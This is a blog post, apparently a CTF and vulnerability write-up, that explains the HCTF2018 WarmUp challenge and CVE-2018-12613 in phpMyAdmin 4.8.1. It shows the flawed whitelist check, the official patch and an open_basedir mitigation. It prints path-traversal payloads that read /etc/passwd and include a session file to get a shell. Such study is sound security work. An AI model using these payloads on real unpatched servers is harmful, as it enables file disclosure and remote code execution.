<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Bantian">





<title>CVE-2018-12613 phpMyAdmin 4.8.1 文件包含漏洞 &amp; HCTF2018 WarmUp | Bantian</title>



    <link rel="icon" href="/my.ico">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        
    


<meta name="generator" content="Hexo 4.2.1"></head>
<body>
    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Bantian&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Bantian&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Archives</a>
                
                    <a class="menu-item" href="/tags">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
        <div class="main">
            <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">CVE-2018-12613 phpMyAdmin 4.8.1 文件包含漏洞 &amp; HCTF2018 WarmUp</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Bantian</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">2020-04-08&nbsp;&nbsp;15:10:00</a>
                        </span>
                    
                    
                </div>
            
        </header>

        <div class="post-content">
            <p>打开题目一张图片，直接查看源码，提示<code>source.php</code>：</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/1.png" alt="1"></p>
<p>访问<code>/source.php</code>得到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>题目接受一个get参数<code>file</code>：</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/3.png" alt="3"></p>
<p>这个参数需要满足2个条件：</p>
<ol>
<li>这个参数得是string类型的；</li>
<li>这个参数传入<code>emmm::checkFile()</code>函数后需要返回<code>true</code>。</li>
</ol>
<p>再来看一下这个<code>checkFile</code>函数，这个函数里有两个陌生的函数：<code>mb_substr</code>和<code>mb_strpos</code>。</p>
<blockquote>
<p><strong>mb_substr</strong></p>
<p>Syntax：<code>mb_substr ( string $str , int $start [, int $length = NULL [, string $encoding = mb_internal_encoding() ]] ) : string</code></p>
<p><code>$str</code>：必需，会从该string中提取子字符串；</p>
<p><code>$start</code>：必需，规定从字符串的何处开始；</p>
<p><code>$length</code>：可选，规定要返回的字符串长度，默认就是到字符串的末尾；</p>
<p><code>encoding</code>：可选，字符编码，默认是内部编码。</p>
<p>Return： 返回字符串的提取部分，如果失败则返回 FALSE，或者返回一个空字符串。 </p>
</blockquote>
<blockquote>
<p><strong>mb_strpos</strong> 同 strpos函数</p>
<p>Syntax：<code>strpos(string,find,start)</code></p>
<p><code>string</code>：必需，被搜索的字符串；</p>
<p><code>find</code>：必需，要查找的字符串；</p>
<p><code>start</code>：可选，开始搜索的位置。</p>
<p>Return： 返回字符串在另一字符串中第一次出现的位置，如果没有找到字符串则返回 FALSE。 </p>
</blockquote>
<p>然后这里还用到了<code>in_array($page, $whitelist)</code>来判断传入的参数<code>$page</code>（就是原始的<code>$_REQUEST[&#39;file&#39;]</code>参数）是不是在<code>$whitelist</code>中。</p>
<p><code>$whitelist</code>是一个有序映射（key=&gt;value）：<code>$whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;];</code></p>
<p>而这里需要搞清楚的是in_array()它是匹配value而不是key，如下图这个例子，被匹配到的是<code>aaa</code>，即value，而不是key。</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/2.png" alt="2"></p>
<p>所以<code>$_REQUEST</code>参数值必需包括<code>source.php</code>或是<code>hint.php</code>。</p>
<p>所以直接令<code>?file=hint.php</code>，程序会执行<code>include $_REQUEST[&#39;file&#39;];</code>也就是<code>include &quot;hint.php&quot;</code>:</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/4.png" alt="4"></p>
<p>提示flag文件在<code>ffffllllaaaagggg</code>，所以我们需要构造使得最后<code>include $_REQUEST[&#39;file&#39;]</code>里能够包含这个文件。</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/5.png" alt="5"></p>
<p>在第17行可以看到，程序会从<code>$page</code>，也就是传入的参数中提取指定长度的字符串，这个长度由<code>mb_strpos($page.&#39;?&#39;, &#39;?&#39;)</code>决定。</p>
<p><code>mb_strpos</code>会从<code>$page.&quot;?&quot;</code>字符串中寻找第一次出现<code>?</code>符号的位置并返回，所以<code>mb_substr($page, 0, mb_strpos($page. &#39;?&#39;, &#39;?&#39;));</code>会返回第一次出现<code>?</code>符号前面的字符串（不包括<code>?</code>符号）。</p>
<p>所以我们只要构造这样的payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file&#x3D;hint.php?..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;ffffllllaaaagggg</span><br></pre></td></tr></table></figure>

<p>就可以在<code>checkFile</code>函数成功返回<code>true</code>，然后就会执行<code>include $_REQUEST[&#39;file&#39;]</code>，将flag文件成功包含。</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/6.png" alt="6"></p>
<h2 id="CVE-2018-12613-phpmyadmin文件包含漏洞"><a href="#CVE-2018-12613-phpmyadmin文件包含漏洞" class="headerlink" title="CVE-2018-12613 phpmyadmin文件包含漏洞"></a>CVE-2018-12613 phpmyadmin文件包含漏洞</h2><p>这道题其实来自CVE-2018-12613，比起上面这道题目要稍微复杂一点。</p>
<h4 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h4><p>该漏洞可以让攻击者在服务器上查看或是执行文件。</p>
<p>漏洞利用前提是攻击者必须先经过身份验证，但以下两种情况例外：</p>
<ol>
<li><code>$cfg[&#39;AllowArbitraryServer&#39;]=true</code>：攻击者可以指定他已经控制的主机，在phpMyAdmin上执行任意代码；</li>
<li><code>$cfg[&#39;ServerDefault&#39;] = 0</code>：能绕过登录，允许在没有经过任何身份验证的情况下运行容易受到攻击的代码。</li>
</ol>
<p>这个漏洞还是挺严重的，官方的评级是<code>Severe</code>。</p>
<h4 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h4><p>phpMyAdmin 4.8.0和4.8.1</p>
<h4 id="复现环境"><a href="#复现环境" class="headerlink" title="复现环境"></a>复现环境</h4><ul>
<li>Ubuntu 18.04</li>
<li>php 5.6.40 + phpMyAdmin 4.8.1 + Mysql 5.7</li>
</ul>
<p>创建PHP My Admin用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; CREATE USER &#39;pma481&#39;@&#39;%&#39; IDENTIFIED BY &#39;123456&#39;;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br></pre></td></tr></table></figure>

<p>授予超级用户权限：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; GRANT ALL PRIVILEGES ON *.* TO &#39;pma481&#39;@&#39;%&#39; WITH GRANT OPTION;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.02 sec)</span><br></pre></td></tr></table></figure>

<h4 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h4><p><code>index.php</code>:</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/7.png" alt="7"></p>
<p>第55行的if条件需要满足5个条件：</p>
<ol>
<li><code>!empty($_REQUEST[&#39;target&#39;])</code>：<code>target</code>参数需要存在；</li>
<li><code>is_string($_REQUEST[&#39;target&#39;])</code>：<code>target</code>参数需要是string类型的；</li>
<li><code>!preg_match(&#39;/^index/&#39;, $_REQUEST[&#39;target&#39;])</code>：<code>target</code>参数不能以<code>index</code>开头；</li>
<li><code>!in_array($_REQUEST[&#39;target&#39;, $target_blacklist)</code>：<code>target</code>参数值不能在<code>$target_blacklist</code>中；</li>
<li><code>Core::checkPageValidity($_REQUEST[&#39;target&#39;]</code>：<code>target</code>值需要通过该check函数。</li>
</ol>
<p><code>$target_blacklist</code>也定义在<code>index.php</code>中：</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/8.png" alt="8"></p>
<p>只要<code>target</code>的值不在<code>$target_blacklist</code>中就可以绕过了，所以前4个条件很容易满足。</p>
<p>跟进<code>checkPageValidity</code>函数（位于<code>libraries/classes/Core.php</code>文件）：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">        $whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    $_page = urldecode($page);</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>因为没有传进<code>$whitelist</code>参数，所以开始<code>$whitelist</code>被初始化为<code>self::$goto_whitelist</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> $goto_whitelist = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">'db_datadict.php'</span>,</span><br><span class="line">    <span class="string">'db_sql.php'</span>,</span><br><span class="line">    <span class="string">'db_events.php'</span>,</span><br><span class="line">    <span class="string">'db_export.php'</span>,</span><br><span class="line">    <span class="string">'db_importdocsql.php'</span>,</span><br><span class="line">    <span class="string">'db_multi_table_query.php'</span>,</span><br><span class="line">    <span class="string">'db_structure.php'</span>,</span><br><span class="line">    <span class="string">'db_import.php'</span>,</span><br><span class="line">    <span class="string">'db_operations.php'</span>,</span><br><span class="line">    <span class="string">'db_search.php'</span>,</span><br><span class="line">    <span class="string">'db_routines.php'</span>,</span><br><span class="line">    <span class="string">'export.php'</span>,</span><br><span class="line">    <span class="string">'import.php'</span>,</span><br><span class="line">    <span class="string">'index.php'</span>,</span><br><span class="line">    <span class="string">'pdf_pages.php'</span>,</span><br><span class="line">    <span class="string">'pdf_schema.php'</span>,</span><br><span class="line">    <span class="string">'server_binlog.php'</span>,</span><br><span class="line">    <span class="string">'server_collations.php'</span>,</span><br><span class="line">    <span class="string">'server_databases.php'</span>,</span><br><span class="line">    <span class="string">'server_engines.php'</span>,</span><br><span class="line">    <span class="string">'server_export.php'</span>,</span><br><span class="line">    <span class="string">'server_import.php'</span>,</span><br><span class="line">    <span class="string">'server_privileges.php'</span>,</span><br><span class="line">    <span class="string">'server_sql.php'</span>,</span><br><span class="line">    <span class="string">'server_status.php'</span>,</span><br><span class="line">    <span class="string">'server_status_advisor.php'</span>,</span><br><span class="line">    <span class="string">'server_status_monitor.php'</span>,</span><br><span class="line">    <span class="string">'server_status_queries.php'</span>,</span><br><span class="line">    <span class="string">'server_status_variables.php'</span>,</span><br><span class="line">    <span class="string">'server_variables.php'</span>,</span><br><span class="line">    <span class="string">'sql.php'</span>,</span><br><span class="line">    <span class="string">'tbl_addfield.php'</span>,</span><br><span class="line">    <span class="string">'tbl_change.php'</span>,</span><br><span class="line">    <span class="string">'tbl_create.php'</span>,</span><br><span class="line">    <span class="string">'tbl_import.php'</span>,</span><br><span class="line">    <span class="string">'tbl_indexes.php'</span>,</span><br><span class="line">    <span class="string">'tbl_sql.php'</span>,</span><br><span class="line">    <span class="string">'tbl_export.php'</span>,</span><br><span class="line">    <span class="string">'tbl_operations.php'</span>,</span><br><span class="line">    <span class="string">'tbl_structure.php'</span>,</span><br><span class="line">    <span class="string">'tbl_relation.php'</span>,</span><br><span class="line">    <span class="string">'tbl_replace.php'</span>,</span><br><span class="line">    <span class="string">'tbl_row_action.php'</span>,</span><br><span class="line">    <span class="string">'tbl_select.php'</span>,</span><br><span class="line">    <span class="string">'tbl_zoom_select.php'</span>,</span><br><span class="line">    <span class="string">'transformation_overview.php'</span>,</span><br><span class="line">    <span class="string">'transformation_wrapper.php'</span>,</span><br><span class="line">    <span class="string">'user_password.php'</span>,</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<p>从<code>checkPageValidity</code>函数中可以看到，传入的<code>$page</code>参数中要通过该函数验证满足以下一个条件就可以：</p>
<ol>
<li><code>$page</code>参数包含在<code>$whitelist</code>之中；</li>
<li>经过<code>mb_substr</code>的<code>$page</code>参数（也就是<code>$_page</code>参数），需要包含在<code>$whitelist</code>中；</li>
<li>对<code>$_page</code>参数进行<code>urldecode</code>之后，再进行一个次<code>mb_substr</code>的结果在<code>$whitelist</code>中。</li>
</ol>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/9.png" alt="9"></p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>poc：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost&#x2F;phpMyAdmin-4.8.1&#x2F;index.php?target&#x3D;db_sql.php%3f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/10.png" alt="10"></p>
<p><strong>getshell</strong>：</p>
<p>选择SQL，执行select语句：</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/15.png" alt="15"></p>
<p>php会序列化参数传递的值，然后保存在本地的session文件中，对于Linux的session保存目录就是<code>/var/lib/php/sessions</code>，对应的session文件就是<code>sess_[your session id]</code>。</p>
<p>所以F12查看一下当前查询的session：</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/13.png" alt="13"></p>
<p>所以对应的session文件就是<code>/var/lib/php/sessions/sess_92o01utbpqift1ogm86flv4beeapadek</code>。</p>
<p>payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localhost&#x2F;phpMyAdmin-4.8.1&#x2F;index.php?target&#x3D;db_sql.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;var&#x2F;lib&#x2F;php&#x2F;sessions&#x2F;sess_92o01utbpqift1ogm86flv4beeapadek</span><br></pre></td></tr></table></figure>

<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/14.png" alt="14"></p>
<p>官方给出的缓解手段是设置正确的<code>open_basedir</code>，比如在<code>php.ini</code>中将<code>open_basedir</code>设置为<code>/var/www/html</code>，然后重启apache服务器，再执行上述getshell操作，发现被拦截了。</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/16.png" alt="16"></p>
<h4 id="官方修复"><a href="#官方修复" class="headerlink" title="官方修复"></a>官方修复</h4><p><code>index.php</code>：</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/11.png" alt="11"></p>
<p><code>libraries/classes/Core.php</code>：</p>
<p><img src="/2020/04/08/CVE-2018-12613-phpMyAdmin4.8.1%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E&HCTF2018_WarmUp_WriteUp/imgs/12.png" alt="12"></p>
<p>从官方补丁来看，修复之后就是直接根据第一次<code>in_array($page, $whitelist)</code>的结果来判断<code>$page</code>参数的合法性。</p>

        </div>

        
            <section class="post-copyright">
                
                    <p class="copyright-item">
                        <span>Author:</span>
                        <span>Bantian</span>
                    </p>
                
                
                
                    <p class="copyright-item">
                        <span>License:</span>
                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank" rel="noopener">CC-BY-NC-4.0</a> LICENSE</span>
                    </p>
                
                
                     <p class="copyright-item">
                         <span>Slogan:</span>
                         <span>早睡早起身体好</span>
                     </p>
                

            </section>
        
        <section class="post-tags">
            <div>
                <span>Tag(s):</span>
                <span class="tag">
                    
                    
                        <a href="/tags/Web/"># Web</a>
                    
                        <a href="/tags/CVE/"># CVE</a>
                    
                        
                </span>
            </div>
            <div>
                <a href="javascript:window.history.back();">back</a>
                <span>· </span>
                <a href="/">home</a>
            </div>
        </section>
        <section class="post-nav">
            
                <a class="prev" rel="prev" href="/2020/04/10/%5BWUSTCTF2020%5D%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2/">WUSCTF2020_颜值成绩查询</a>
            
            
            <a class="next" rel="next" href="/2020/04/05/Type-Juggling-in-PHP-%E4%B8%8A/">Type Juggling in PHP-上</a>
            
        </section>


    </article>
</div>

        </div>
        <footer id="footer" class="footer">
    <div class="copyright">
        <span>© Bantian | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
    </div>
</footer>

    </div>
</body>
</html>
